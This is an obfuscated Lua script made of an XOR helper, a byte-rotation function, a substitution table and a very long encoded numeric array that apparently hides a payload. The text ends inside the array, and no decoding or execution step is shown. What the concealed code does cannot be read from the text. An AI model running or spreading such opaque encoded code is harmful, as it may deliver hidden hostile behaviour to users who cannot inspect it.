local _pgxvW1b=bit32 and bit32.bxor or function(a,b) local r,p=0,1 while a>0 or b>0 do local x,y=a%2,b%2 if x~=y then r=r+p end a,b,p=(a-x)/2,(b-y)/2,p*2 end return r end
local function _feundefinedundefinedL0h(v,r) if r==0 then return v end local lo=v%(2^r) local hi=math.floor(v/(2^r)) return (hi+lo*(2^(8-r)))%256 end
local _edgVEf=(255*237)%256
local _hSMundefinedMi={138,95,149,200,52,182,211,185,77,36,104,0,172,217,221,93,181,209,96,210,160,241,53,163,245,7,41,107,130,74,146,205,159,132,230,139,100,154,64,75,91,1,213,220,214,136,198,70,191,71,45,60,240,195,19,212,31,215,151,140,76,102,173,33,122,81,235,105,186,115,222,116,254,15,30,175,46,26,178,87,99,248,249,236,17,199,239,150,161,21,108,203,113,184,18,83,137,84,103,11,14,253,144,229,8,110,62,9,34,251,97,166,73,255,194,10,204,117,65,29,123,72,78,112,128,162,250,121,228,56,80,165,143,25,193,50,20,171,5,177,155,152,66,207,4,47,157,6,247,2,252,92,224,135,124,208,90,127,246,219,48,142,148,227,206,232,32,174,190,101,89,231,24,94,192,38,188,202,3,223,114,23,88,61,42,27,153,169,189,170,244,85,131,28,59,197,109,167,57,164,218,119,156,134,168,54,13,39,37,69,63,233,187,82,22,16,234,183,147,58,145,141,196,86,51,44,158,12,180,125,120,118,106,98,126,242,238,216,176,55,243,67,79,226,237,49,35,111,68,40,225,43,133,129,201,179}
local _trRY0b={{190,224,57,106,109,105,48,46,254,209,240,182,140,226,47,246,165,48,195,45,116,116,5,26,247,231,13,218,150,108,111,10,136,163,200,106,223,182,173,177,230,19,214,16,76,173,244,244,11,182,246,57,175,161,66,36,129,253,6,246,164,99,152,42,69,243,161,153,10,72,117,8,254,246,240,121,178,50,57,113,234,174,117,239,67,212,61,13,86,216,13,56,29,107,153,151,42,165,160,63,222,152,28,190,190,78,151,71,43,232,106,244,249,40,152,56,71,87,43,109,183,231,13,43,42,18,185,216,69,2,161,153,13,165,96,143,121,187,78,203,35,55,130,162,76,204,59,208,67,120,43,184,138,191,105,119,218,146,110,50,148,83,65,10,179,121,58,30,248,130,242,91,147,99,57,252,249,174,156,40,164,159,198,92,40,128,47,20,71,9,49,44,20,167,234,93,139,238,232,143,121,187,78,61,247,101,57,251,128,48,193,240,71,251,17,245,158,191,72,29,28,94,246,178,69,9,113,125,19,110,202,100,111,69,191,9,202,220,43,108,25,204,144,190,45,248,218,184,247,16,246,5,162,246,110,41,100,9,187,49,36,121,117,35,111,42,131,142,97,190,160,153,85,232,184,64,185,164,34,84,214,85,52,20,61,18,187,55,55,139,216,120,141,134,218,78,85,151,249,139,141,118,33,199,141,173,21,1,150,88,98,209,247,29,251,220,202,147,28,149,111,94,113,240,90,36,113,70,2,8,223,227,147,116,230,113,144,162,198,145,97,127,162,7,54,46,128,104,205,244,252,241,114,99,244,215,19,107,58,46,54,100,180,93,193,44,207,15,37,89,172,64,120,88,255,30,231,170,255,160,128,108,152,216,111,85,196,130,22,3,55,215,177,62,129,234,128,146,235,15,120,182,41,145,71,251,17,133,23,9,236,146,42,101,107,105,31,94,65,138,119,72,17,14,85,149,95,9,187,5,47,224,206,194,184,183,120,251,217,130,30,205,18,104,42,101,107,105,31,94,65,138,119,72,17,14,85,149,95,9,187,5,106,0,89,232,15,130,62,102,155,182,112,205,18,104,42,101,107,105,31,94,65,138,119,72,17,14,85,149,95,9,187,5,47,224,206,194,184,183,120,251,217,130,30,205,18,104,42,101,107,105,31,94,65,138,119,72,17,14,85,149,95,232,9,116,132,126,239,227,125,168,43,160,17,130,185,161,157,124,164,107,46,178,95,248,249,135,253,149,225,163,121,130,240,130,221,61,151,191,77,65,144,168,43,160,83,241,158,62,153,43,42,18,133,6,148,152,78,250,205,148,29,190,146,124,240,182,160,55,243,6,77,204,68,156,164,164,244,164,201,231,147,11,90,217,165,97,138,0,113,138,10,143,58,46,146,78,214,80,188,99,255,235,165,239,53,57,189,116,103,150,129,253,72,29,164,18,107,255,9,252,160,135,139,150,130,158,249,80,120,182,109,157,57,246,206,232,219,56,147,77,5,185,189,31,103,126,28,94,246,178,69,9,113,148,36,16,28,78,85,151,165,11,140,132,244,6,27,158,36,143,189,68,61,13,140,155,105,243,218,159,162,20,199,113,251,70,90,223,58,222,248,151,95,61,112,113,244,191,189,8,144,75,147,160,126,30,247,216,228,29,205,101,195,240,150,167,17,221,90,143,173,143,116,214,248,52,140,50,57,196,255,133,170,158,71,180,60,96,38,9,110,20,150,32,252,222,167,152,251,63,42,184,28,78,85,151,130,109,254,211,213,78,189,158,24,120,185,164,9,138,185,30,141,73,200,34,195,241,52,99,3,10,47,82,162,20,2,170,120,56,221,28,248,215,27,172,119,57,140,161,126,69,249,85,47,38,166,243,195,105,111,97,187,215,19,247,240,172,168,130,223,229,104,61,248,196,92,133,147,64,58,47,47,184,237,160,132,126,197,107,6,42,52,159,187,153,130,182,173,163,145,103,240,203,254,249,171,244,11,194,125,99,37,53,66,150,244,158,24,181,164,234,239,128,111,94,113,63,145,110,102,241,28,187,235,11,186,161,45,215,165,35,152,36,150,212,17,130,185,152,13,246,218,199,170,97,148,0,214,184,36,247,102,157,123,151,95,61,178,101,243,199,168,227,53,10,147,159,17,90,158,216,157,78,128,146,46,128,67,83,65,10,181,146,181,196,254,148,192,130,186,157,171,74,236,8,91,252,121,225,182,86,115,155,28,95,28,99,152,115,42,97,187,153,205,182,173,172,15,112,151,11,109,43,29,215,124,49,205,155,71,251,17,34,62,216,151,76,90,9,29,10,114,77,113,2,196,245,78,231,254,250,145,221,76,43,153,162,76,215,219,1,251,212,126,26,185,205,128,123,120,234,46,20,100,57,124,15,2,105,211,252,177,100,244,232,35,89,41,215,141,232,175,239,175,159,5,184,30,83,145,142,55,120,152,42,96,143,214,70,68,175,246,230,177,78,201,85,22,55,114,162,141,8,215,185,216,160,238,36,115,158,165,20,78,9,195,105,111,84,243,250,238,121,102,230,2,216,235,85,35,50,255,113,105,22,145,64,120,88,121,51,220,62,207,76,90,9,29,10,126,77,113,41,196,36,53,78,191,146,191,173,74,72,106,138,105,189,59,45,247,87,224,106,220,152,103,38,90,18,107,255,2,142,251,47,196,165,86,164,172,246,180,52,162,111,171,124,236,9,170,158,71,190,232,84,213,216,147,160,218,73,17,97,96,178,9,153,19,110,28,238,177,130,120,11,140,58,244,125,234,239,21,163,71,251,17,133,23,29,103,56,61,9,252,237,95,8,136,10,119,105,225,35,145,234,172,56,221,178,230,169,239,219,85,45,251,238,155,58,220,152,47,29,191,123,111,120,9,97,187,215,19,247,240,78,85,151,153,152,35,89,45,12,62,239,145,43,119,180,47,184,169,13,128,161,54,199,25,115,9,9,161,182,39,182,116,196,1,250,169,130,202,5,230,254,25,204,175,239,175,159,5,30,140,85,157,56,205,101,195,209,42,54,17,182,243,184,28,196,249,204,223,85,25,55,174,48,249,227,128,185,216,160,238,36,115,158,85,20,166,9,46,100,111,94,113,148,36,16,28,241,2,35,77,66,130,226,143,243,109,82,125,152,123,221,156,70,139,9,47,38,56,107,153,255,44,54,136,216,169,110,6,196,172,148,191,9,202,158,153,205,57,48,18,10,189,164,126,164,178,193,28,5,218,63,179,227,20,223,136,216,205,240,25,241,107,210,245,152,28,101,57,124,249,239,36,108,147,114,5,184,30,83,28,65,29,120,246,6,148,152,78,13,200,16,232,46,230,173,241,38,17,89,248,92,57,189,53,143,247,30,69,119,115,83,18,43,236,142,6,130,134,248,249,135,253,149,178,153,54,35,230,75,179,226,43,247,11,83,113,3,37,110,103,26,109,234,197,56,164,76,46,109,109,224,151,250,238,16,210,157,54,149,191,54,230,99,174,254,62,4,193,208,242,255,115,245,201,231,147,216,246,253,1,255,212,99,210,56,23,110,6,143,150,210,245,85,76,157,255,48,239,40,56,22,251,225,103,86,155,39,90,160,128,146,241,255,31,83,196,216,109,184,173,42,249,94,151,152,85,215,118,48,236,223,113,158,71,119,9,138,185,32,194,95,28,214,164,100,167,159,160,63,238,184,28,172,150,112,151,242,109,43,95,191,140,158,219,239,139,212,43,184,30,83,134,126,94,62,179,170,216,54,136,63,19,146,79,19,248,143,245,61,187,226,167,243,13,72,110,64,146,228,129,81,185,48,128,121,129,43,96,32,111,208,113,194,243,12,225,241,107,210,245,152,28,101,57,124,249,239,36,87,189,58,238,134,109,191,90,22,244,18,107,255,81,224,200,216,145,20,79,157,248,153,168,166,179,226,33,247,11,9,215,185,68,161,238,88,55,31,147,56,128,32,252,237,95,8,136,13,42,0,102,78,85,151,108,31,9,217,151,124,249,190,205,72,175,225,126,30,140,85,157,56,205,101,195,209,42,54,17,182,243,184,28,196,249,204,223,85,25,55,174,48,249,227,128,185,68,161,238,88,55,31,147,56,128,32,252,222,69,252,161,70,238,105,17,78,28,187,235,11,9,232,202,251,27,48,59,64,11,161,238,26,109,253,73,38,166,32,111,70,111,94,113,94,205,81,6,190,80,158,240,139,221,50,189,196,77,179,235,169,140,59,126,164,81,207,132,126,182,62,179,100,167,0,196,216,145,146,102,164,249,24,223,182,221,50,45,192,239,131,246,156,145,88,217,184,64,240,103,243,191,32,111,147,57,11,3,10,132,245,78,43,187,124,245,152,221,228,132,125,189,158,193,206,249,120,182,164,244,152,128,104,205,214,164,100,167,159,160,63,238,184,28,241,2,35,77,66,130,226,95,138,7,72,91,126,37,159,224,153,158,191,128,121,164,107,179,50,32,83,65,10,181,146,181,196,254,148,192,130,186,157,171,74,236,8,175,45,139,184,148,109,192,231,47,15,54,199,106,100,69,223,160,67,90,223,58,222,248,151,95,61,112,254,57,215,57,169,81,214,37,30,238,109,15,31,72,76,242,234,233,128,111,94,113,43,131,16,66,182,249,148,240,168,142,220,44,246,89,223,170,158,71,47,47,184,19,53,132,126,242,120,152,100,20,152,214,184,19,81,185,196,145,112,145,61,187,226,82,145,105,36,90,206,7,59,224,146,175,238,40,124,218,120,173,233,212,77,113,2,196,36,25,241,1,124,120,85,188,111,255,48,239,40,56,22,251,225,103,86,155,29,13,20,90,130,165,97,67,143,249,49,223,105,17,78,115,173,131,85,147,132,151,205,62,72,145,191,175,88,217,184,40,196,147,20,164,62,180,255,15,83,36,206,243,240,78,163,123,187,245,38,140,28,235,162,251,189,156,208,150,225,182,126,185,205,128,78,128,94,246,70,159,248,21,153,19,203,109,7,150,95,108,197,141,163,230,100,139,133,147,64,234,196,255,77,23,196,147,20,164,62,180,109,90,143,71,63,12,16,80,50,54,149,191,166,229,232,95,124,239,189,205,155,247,145,224,86,15,83,18,43,202,32,164,130,52,50,187,70,238,165,9,143,123,47,120,229,9,254,57,215,57,169,81,206,249,120,182,164,244,152,128,104,205,99,152,115,42,31,244,41,47,72,17,14,85,149,95,9,187,5,47,224,206,194,184,183,120,251,217,130,30,205,18,104,42,101,107,105,31,94,65,138,119,72,17,14,85,149,95,9,187,5,47,224,206,194,184,183,120,251,217,84,112,30,128,123,69,154,161,32,243,83,243,194,61,18,73,241,57,35,95,9,187,5,47,224,206,194,184,183,120,251,217,130,30,205,18,104,42,101,107,105,31,94,65,138,119,72,17,14,85,149,95,9,187,5,47,224,206,194,184,183,120,251,217,130,30,205,18,104,28,199,153,170,96,113,200,10,232,110,28,53,123,250,223,11,202,113,132,16,105,227,145,87,140,161,203,32,190,154,17,43,249,34,195,98,167,9,121,125,42,203,102,20,2,151,191,61,202,42,132,92,27,45,235,31,71,10,217,184,169,9,255,43,205,18,195,216,167,162,205,215,10,198,218,78,85,151,110,152,188,173,75,235,124,204,144,64,71,88,17,139,143,166,47,160,231,58,164,42,96,223,251,216,205,149,25,241,2,151,191,61,202,226,230,246,11,182,246,57,175,161,66,36,129,253,6,246,164,99,152,42,69,243,161,153,122,64,102,157,170,216,223,38,47,154,17,255,234,239,85,120,37,88,17,184,185,83,128,43,205,18,195,255,111,232,96,90,139,105,117,78,54,151,191,61,202,226,230,246,11,133,147,185,71,88,17,184,185,83,128,43,205,18,195,255,127,77,244,10,10,105,117,78,54,151,191,61,202,226,230,39,168,232,125,64,71,88,17,184,185,182,255,126,205,18,195,255,111,83,113,10,42,143,117,142,172,8,18,142,254,211,171,246,239,239,128,64,3,225,43,69,213,216,151,29,205,164,195,241,111,223,78,135,205,238,117,78,54,151,191,61,202,226,230,246,11,232,85,1,145,16,83,154,158,216,147,216,77,76,153,186,90,167,17,135,8,238,117,78,54,151,191,61,202,226,171,6,124,204,144,64,71,88,17,184,185,83,128,117,150,146,179,50,69,9,188,70,177,110,6,231,254,148,120,228,109,43,101,113,234,239,128,87,140,161,203,32,31,159,153,142,164,53,7,255,111,83,113,10,10,105,117,78,54,151,191,132,230,163,106,246,11,232,125,64,71,88,17,184,185,83,128,196,252,199,195,255,111,83,113,10,10,105,117,78,54,151,86,127,9,226,230,246,11,232,125,64,71,88,17,184,185,46,255,43,205,18,195,255,111,83,113,93,139,238,117,78,54,151,240,11,52,72,106,162,189,131,144,185,45,183,217,130,30,205,18,104,42,101,107,105,31,94,65,138,119,72,17,14,85,149,95,9,187,5,47,224,206,194,184,183,120,251,217,130,30,205,18,104,42,101,107,105,31,94,65,138,119,72,17,14,2,35,77,61,68,245,82,235,150,232,45,140,89,104,131,182,30,205,18,104,42,101,107,105,31,94,65,138,119,72,17,14,85,149,95,9,187,5,47,224,206,194,184,183,120,251,217,130,30,205,18,104,42,101,107,105,31,94,65,138,119,72,17,14,85,149,214,232,35,89,41,215,141,232,217,156,28,46,238,150,109,253,128,65,29,120,246,209,133,54,251,209,216,184,45,63,188,173,214,61,202,226,230,244,249,40,152,56,71,78,205,109,81,166,52,56,218,146,195,105,111,163,200,106,223,182,173,172,15,47,120,182,147,173,57,162,76,204,125,64,71,88,43,88,143,166,47,43,182,107,182,134,197,113,57,33,10,72,117,206,81,187,247,130,62,187,116,191,189,131,31,239,251,163,238,134,230,216,47,99,231,159,17,97,96,178,94,106,166,200,225,20,2,173,191,61,202,226,243,128,11,239,53,72,71,78,205,109,81,166,52,56,218,146,195,170,67,83,249,216,238,105,237,190,121,45,90,235,47,120,230,124,148,158,18,185,71,88,17,184,185,83,128,43,166,9,179,50,67,0,244,10,10,105,117,50,80,69,214,232,202,226,230,246,141,173,21,1,150,88,58,116,131,166,157,38,150,203,195,105,100,83,113,10,10,105,117,78,54,24,172,235,62,55,41,124,234,174,71,231,164,72,198,189,220,155,72,56,198,7,6,216,179,125,21,72,109,152,181,177,185,172,162,38,85,55,153,251,105,131,222,3,37,104,17,184,185,83,103,61,205,32,246,100,111,137,160,47,36,146,210,158,170,151,245,122,109,157,106,246,11,232,125,64,71,88,17,185,115,152,197,22,90,199,195,255,111,83,161,70,130,238,78,78,54,151,191,16,76,173,244,244,11,192,205,57,251,212,126,26,213,85,90,160,205,101,7,255,111,83,113,10,10,105,117,44,246,187,151,235,47,132,171,125,154,184,246,143,153,145,69,185,201,152,73,163,150,94,151,7,220,97,200,106,13,81,246,230,177,112,223,16,112,72,106,199,11,232,125,64,164,29,17,134,145,155,13,29,90,120,25,170,167,9,244,10,10,105,117,190,80,69,191,221,188,43,45,162,189,189,175,208,140,159,83,241,158,62,153,167,61,76,29,128,67,72,210,255,232,16,28,238,185,172,151,152,52,209,44,246,153,186,125,72,251,161,5,77,185,152,42,29,90,199,195,255,111,83,113,10,10,105,173,50,123,210,151,11,9,226,230,246,11,158,18,31,37,104,17,184,185,83,40,38,166,18,249,138,111,139,187,216,109,105,185,157,54,250,90,235,254,43,220,196,223,48,21,117,167,120,203,19,84,199,153,56,198,7,6,216,179,252,161,70,28,245,25,78,170,112,214,232,202,226,230,246,11,232,125,64,164,29,17,58,109,85,47,167,162,130,28,10,136,139,187,216,109,240,25,241,54,151,191,61,202,226,230,246,239,239,128,64,216,225,224,36,150,77,105,243,218,92,153,170,138,143,225,38,8,251,86,158,80,69,168,71,62,89,21,168,42,232,6,158,71,184,182,116,115,182,128,56,158,9,46,20,100,83,113,10,10,105,117,78,54,151,191,61,202,190,151,46,239,239,53,239,153,62,162,107,145,216,6,5,128,76,153,10,90,224,187,215,8,238,117,78,54,151,191,61,202,226,230,246,11,232,193,45,175,161,182,86,23,83,128,43,205,18,195,255,111,143,249,69,139,105,117,78,54,78,145,242,9,50,153,122,168,204,65,190,120,251,217,130,30,205,18,104,42,101,107,105,31,94,65,138,119,72,17,14,85,149,95,9,187,5,47,224,206,194,184,183,120,251,217,130,30,205,18,104,42,101,107,105,31,94,65,138,119,72,78,170,57,151,210,132,3,161,230,252,109,180,234,252,151,116,17,136,64,29,246,11,167,199,22,14,31,94,65,138,119,72,17,14,85,149,95,9,187,5,47,224,206,194,184,183,120,251,217,130,30,205,18,104,42,101,107,105,31,94,65,138,119,72,17,14,85,149,95,9,187,5,47,224,206,194,144,185,150,225,203,109,214,83,40,246,90,108,179,115,167,0,113,206,42,146,45,35,145,234,172,56,221,178,248,92,57,189,53,143,119,51,155,84,185,83,128,43,61,76,182,97,190,83,209,176,238,21,210,157,54,149,214,61,202,226,230,246,11,232,125,41,150,120,195,164,81,199,197,231,181,93,6,42,179,50,251,153,13,21,190,100,145,8,18,190,9,226,230,246,11,232,125,64,71,88,17,184,185,207,95,231,55,7,6,42,227,115,57,63,42,184,28,43,187,124,245,152,221,209,44,199,11,232,125,64,71,88,17,184,185,83,128,43,164,146,164,128,100,83,113,10,10,105,117,78,54,19,214,232,202,226,230,246,105,4,125,152,43,184,238,88,244,9,128,43,205,18,152,42,179,83,209,176,238,21,210,157,22,68,60,134,142,209,117,46,239,35,145,152,43,184,238,88,244,207,132,126,205,18,195,255,69,0,121,10,169,110,6,196,172,148,88,128,254,111,243,16,141,158,125,72,5,212,126,84,23,83,128,43,205,18,195,255,111,252,161,63,116,247,28,78,150,210,245,85,76,157,106,246,11,232,125,45,28,142,155,164,244,22,255,126,137,207,107,105,31,94,65,138,119,72,17,14,85,149,95,9,187,5,47,224,206,194,184,183,120,251,217,130,30,205,18,104,42,101,107,105,31,94,65,138,119,72,17,14,85,149,95,9,187,5,47,224,168,209,65,64,68,115,156,70,185,254,145,121,77,199,22,14,31,94,65,138,119,72,17,14,85,149,95,9,187,5,47,224,206,194,184,183,120,251,217,130,30,205,18,104,42,101,107,105,31,94,65,138,119,72,17,14,85,149,95,9,187,5,47,224,206,194,144,185,150,225,203,109,214,83,40,246,90,108,179,115,167,0,113,72,36,81,6,116,172,69,168,154,9,232,230,246,11,232,59,208,67,120,43,184,55,31,147,56,128,32,195,105,111,50,251,70,130,12,185,177,246,250,145,228,28,101,57,124,249,239,37,3,37,104,17,184,185,83,103,61,205,32,246,100,111,159,160,63,238,184,28,78,123,47,240,11,9,226,230,246,11,232,125,64,71,59,5,26,145,155,157,43,121,107,153,67,95,31,113,10,10,105,102,157,170,173,214,61,202,226,230,244,249,40,152,56,71,87,224,106,220,152,103,38,90,18,107,255,216,54,136,63,19,146,79,68,49,234,223,16,188,132,171,178,249,219,246,72,164,225,126,84,185,83,128,43,61,76,182,97,190,83,203,250,146,182,117,14,54,243,187,85,17,89,153,78,7,80,81,208,150,161,238,164,247,216,228,29,28,199,195,255,111,83,200,216,166,152,232,78,124,151,95,232,202,226,230,246,11,232,125,64,249,225,230,150,15,216,90,142,191,113,195,136,100,83,113,10,10,105,117,78,54,60,235,34,109,28,68,246,164,232,90,64,144,104,17,184,185,83,128,43,205,18,100,59,100,31,113,10,10,105,232,143,121,187,78,61,204,226,47,199,11,232,125,64,71,88,17,184,138,85,72,231,164,234,246,42,52,48,113,203,139,105,117,78,54,151,191,61,202,254,243,107,234,215,172,64,224,88,234,184,97,9,128,43,205,18,195,255,111,83,116,240,139,238,117,78,54,151,77,48,202,193,212,25,227,82,125,15,76,234,210,9,64,83,112,106,92,231,129,255,114,248,116,13,139,105,117,78,54,170,223,240,254,116,171,138,249,169,21,40,119,104,17,184,185,83,128,43,205,18,198,138,100,83,113,10,10,105,117,78,54,115,63,232,202,226,230,246,11,232,125,64,146,228,244,76,213,142,135,11,228,142,7,255,111,83,113,93,139,238,117,78,54,151,77,48,202,228,199,7,49,232,198,89,252,191,192,184,247,126,152,43,242,43,54,53,2,83,0,120,23,223,73,241,54,151,191,61,162,89,45,246,105,232,184,64,234,20,17,126,185,22,90,126,28,18,195,255,111,83,113,10,10,16,86,78,80,112,245,61,247,101,57,251,128,48,193,240,71,184,205,164,244,9,128,43,205,18,195,255,111,83,113,10,10,105,77,164,248,187,87,232,202,226,230,246,11,232,125,64,189,72,198,84,23,83,128,43,205,18,195,255,111,104,187,133,42,121,102,19,172,210,192,122,142,232,230,246,11,232,125,64,71,88,17,184,185,83,148,92,28,18,195,255,111,83,113,10,10,105,117,78,54,115,63,232,202,226,230,246,11,232,125,64,71,88,17,184,140,126,158,5,238,88,242,32,150,31,113,10,10,105,117,78,54,151,138,232,9,226,230,246,11,232,125,64,71,184,66,106,114,158,64,20,150,120,173,6,44,85,243,241,131,3,96,68,41,19,214,61,202,226,230,162,189,131,144,185,71,88,17,184,81,231,147,246,166,32,195,100,67,54,161,56,68,146,45,241,2,35,77,9,187,5,47,224,206,194,184,183,120,251,217,130,30,205,18,104,42,101,107,105,31,94,65,138,119,72,17,14,85,149,95,9,187,5,47,224,206,194,184,183,120,251,217,130,30,205,18,104,42,199,22,14,111,115,104,125,141,105,219,90,111,100,65,232,126,47,47,224,206,194,184,183,120,251,217,130,30,205,18,104,42,101,107,105,31,94,65,138,119,72,17,14,85,149,95,9,187,5,47,224,206,194,184,183,120,251,217,130,30,205,18,104,42,101,107,105,100,31,200,216,166,152,232,78,168,210,145,227,17,99,132,6,11,179,81,45,171,16,69,36,214,202,221,95,28,199,195,255,111,83,21,216,145,105,185,78,85,151,108,127,202,219,230,122,249,204,144,64,71,88,17,184,185,83,128,231,121,18,46,170,9,83,20,176,238,184,242,190,216,246,191,85,25,50,153,199,11,232,125,64,71,88,17,184,185,83,128,43,232,146,111,97,218,31,113,10,10,105,117,78,54,151,240,11,52,232,106,246,11,232,125,64,71,88,17,36,109,156,105,160,205,217,72,115,190,9,113,138,139,105,117,78,54,151,191,61,202,226,230,246,11,139,59,1,235,212,182,118,145,216,189,192,150,32,151,6,148,252,151,63,97,58,185,46,170,95,214,61,202,226,230,246,11,232,125,64,71,88,17,184,185,83,128,15,242,94,246,100,136,83,214,182,10,16,53,241,54,151,191,61,202,226,230,246,11,232,125,64,71,88,17,184,15,155,197,29,28,18,195,255,111,83,113,10,10,105,117,78,54,19,214,232,202,226,230,246,11,232,125,64,164,29,17,76,114,216,47,160,28,18,195,255,111,83,113,10,10,152,28,238,54,60,87,56,35,116,101,235,226,89,37,214,69,161,69,136,145,152,147,38,90,159,162,20,111,83,113,10,10,105,117,78,254,148,18,61,14,120,243,244,141,215,134,239,145,160,143,36,115,83,147,163,218,32,7,20,111,83,113,10,10,105,117,78,54,151,191,61,35,89,41,215,141,232,219,208,145,160,238,150,109,253,128,104,28,18,195,255,111,83,113,10,10,105,117,78,54,151,191,61,202,254,146,191,141,227,36,130,57,163,224,36,145,152,153,207,128,130,6,100,148,224,249,56,139,105,117,78,54,151,191,61,202,226,230,246,11,227,53,10,147,159,17,76,220,130,153,43,42,199,195,255,111,83,113,10,10,105,117,78,54,151,191,61,202,226,95,97,105,227,59,206,68,220,230,88,214,31,147,29,242,234,233,128,100,31,113,10,10,105,117,78,54,151,191,61,202,226,202,251,27,48,59,64,85,88,217,84,185,83,128,43,205,18,195,255,111,83,113,10,10,105,117,78,7,112,60,56,17,99,132,6,62,221,125,219,37,88,17,184,185,83,128,43,205,18,195,255,111,83,113,10,10,64,185,254,248,162,86,61,130,226,213,199,168,232,125,64,71,88,17,184,185,83,128,43,205,94,246,178,69,9,113,30,10,72,78,78,54,151,191,61,202,226,230,246,11,232,125,64,71,88,17,215,109,202,103,56,150,76,46,109,198,83,30,56,10,105,117,78,54,151,191,61,202,226,230,246,11,232,125,64,171,160,53,164,150,46,128,54,205,239,7,20,111,83,113,10,10,105,117,78,54,151,191,61,160,89,114,191,141,158,175,208,43,46,205,92,23,83,128,43,205,18,195,255,111,83,113,10,10,105,117,78,54,2,63,232,202,226,230,246,11,232,125,64,71,88,17,184,185,83,128,43,249,34,7,255,111,83,113,10,10,105,117,78,54,151,191,61,202,226,230,252,7,180,175,83,3,255,148,51,23,83,128,43,205,18,195,255,111,83,113,10,10,245,78,241,54,151,191,61,202,226,230,246,11,232,125,64,175,120,230,19,150,255,105,231,164,53,106,252,64,219,224,241,131,3,96,68,41,19,214,61,202,226,230,246,11,232,125,45,28,142,155,184,185,83,128,29,90,203,7,128,42,250,244,56,47,156,17,14,85,149,95,9,187,5,47,224,206,194,184,183,120,251,217,130,30,205,18,104,42,101,107,105,31,94,65,138,119,72,17,14,85,149,95,9,187,5,47,224,206,194,184,183,120,251,217,130,23,30,236,43,242,46,40,209,243,60,113,125,23,194,78,170,57,149,95,9,187,5,47,224,206,194,184,183,120,251,217,130,30,205,18,104,42,101,107,105,31,94,65,138,119,72,17,14,85,149,95,9,187,5,47,224,206,194,184,183,120,251,217,130,30,205,18,126,28,94,246,178,69,9,113,45,116,146,202,196,145,112,145,61,100,55,219,113,27,174,145,45,28,78,5,86,15,231,13,216,54,199,7,255,111,83,113,215,19,107,58,46,54,24,120,229,109,43,244,246,206,204,125,64,71,88,17,184,185,83,64,38,166,226,180,96,69,162,161,182,97,110,173,164,248,148,245,221,147,211,171,125,239,204,144,64,71,88,17,150,85,83,157,38,164,18,31,97,34,143,225,106,10,21,191,50,80,173,191,61,202,226,230,246,11,232,193,45,175,161,182,86,23,83,128,43,205,9,46,186,100,31,113,10,10,105,232,143,121,187,78,61,206,99,171,74,129,173,193,72,71,251,155,184,185,83,128,43,205,18,195,77,69,51,161,153,36,165,227,158,248,153,90,152,62,132,95,191,140,158,144,185,71,88,17,184,39,85,198,231,61,9,25,170,20,162,78,38,139,105,117,78,54,151,191,61,202,62,243,162,174,152,53,57,175,164,59,184,146,83,207,92,28,18,195,255,111,83,113,10,10,125,185,50,173,99,223,182,17,28,211,246,164,232,90,158,37,88,17,184,185,83,128,43,205,93,28,41,90,254,47,194,207,132,78,78,54,151,191,154,9,50,153,122,168,204,65,190,120,251,217,130,30,205,18,104,42,101,107,105,31,94,65,138,119,72,17,14,85,149,95,9,187,5,47,224,206,194,184,183,120,251,217,130,30,205,18,104,42,101,107,105,31,94,65,138,119,72,78,170,57,151,80,54,100,42,160,242,168,209,65,183,120,251,217,130,30,205,18,104,42,101,107,105,31,94,65,138,119,72,17,14,85,149,95,9,187,5,47,224,206,194,184,183,120,251,217,130,30,205,18,104,42,101,107,105,31,94,65,138,119,238,78,68,187,124,223,210,188,132,57,251,189,215,15,208,43,163,5,136,145,152,147,38,90,121,31,216,148,162,204,255,97,184,28,157,248,158,245,190,162,101,153,126,57,49,53,143,119,51,155,84,185,83,128,43,94,62,179,170,106,113,225,47,10,72,117,157,172,124,191,134,188,132,132,252,239,174,195,185,37,88,17,184,185,216,40,43,94,62,179,170,106,113,225,47,10,21,191,50,80,173,214,61,202,226,230,246,11,232,125,130,43,184,224,136,145,152,147,38,90,73,25,128,0,223,113,138,139,105,117,78,54,151,191,61,202,226,230,246,11,8,41,48,216,255,17,189,129,196,135,43,2,18,106,252,64,219,224,10,122,105,230,41,230,173,214,61,202,226,230,246,11,232,125,126,175,120,238,116,201,158,246,29,179,120,195,105,100,83,113,10,10,105,117,78,54,151,191,61,202,209,95,124,239,189,205,155,71,62,17,186,64,77,165,106,167,51,133,20,100,83,113,10,10,182,232,177,248,173,214,61,202,226,230,246,11,232,125,130,43,184,224,136,145,152,147,38,90,73,25,128,0,223,113,138,139,105,117,78,54,151,191,61,202,226,230,246,11,8,41,48,216,255,17,189,129,196,135,43,2,18,106,252,64,219,224,10,122,105,230,35,47,172,214,232,202,226,230,246,11,232,125,64,171,184,66,26,145,202,183,5,218,63,179,255,31,31,113,10,10,105,117,78,54,151,191,61,202,226,167,113,57,48,85,156,145,88,110,184,175,254,95,15,28,18,195,255,111,143,249,69,139,182,28,238,188,173,214,48,126,5,47,224,206,194,184,183,120,251,217,130,30,205,18,104,42,101,107,105,31,94,65,138,119,72,17,14,85,149,95,9,187,5,47,224,206,194,184,183,120,251,217,130,30,205,18,104,42,101,107,20,187,57,113,82,61,49,230,78,177,62,129,61,68,62,17,192,181,232,6,64,171,224,70,70,139,240,255,146,137,101,107,105,31,94,65,138,119,72,17,14,85,149,95,9,187,5,47,224,206,194,184,183,120,251,217,130,30,205,18,104,42,101,107,105,31,94,65,138,119,72,17,14,85,149,95,9,187,5,47,199,168,189,152,155,162,164,230,139,158,255,157,216,121,62,46,178,9,167,187,70,28,245,78,241,54,151,191,61,161,154,243,244,234,232,85,1,145,16,83,154,158,216,147,216,242,46,40,209,243,60,216,125,23,194,4,252,4,216,244,78,206,217,165,206,11,131,53,185,37,88,17,184,185,83,128,43,205,234,144,255,44,54,136,216,243,152,173,222,54,124,172,130,221,232,230,246,11,232,125,64,71,88,17,184,185,83,246,20,155,217,182,70,95,143,249,72,68,146,6,50,216,95,138,232,202,226,230,246,11,232,125,64,189,72,198,84,23,83,128,43,205,9,46,186,100,143,249,69,8,238,78,170,57,149,95,9,187,5,47,224,206,194,184,183,120,251,217,130,30,205,18,104,42,101,107,105,31,94,65,138,119,72,17,14,85,149,95,9,187,5,47,224,206,194,184,183,120,251,217,130,30,205,18,126,137,207,195,191,44,232,0,10,23,75,211,89,54,100,180,93,193,232,164,0,206,194,184,183,120,251,217,130,30,205,18,104,42,101,107,105,31,94,65,138,119,72,17,14,85,149,95,9,187,5,47,224,206,194,184,183,120,251,217,130,30,205,18,104,42,101,107,105,31,94,244,56,238,152,181,181,249,234,90,235,161,157,121,128,72,239,21,72,164,225,126,92,38,9,255,43,205,18,195,147,181,167,200,135,10,21,58,177,225,162,30,235,254,132,121,153,193,165,219,83,89,224,148,209,241,182,128,99,128,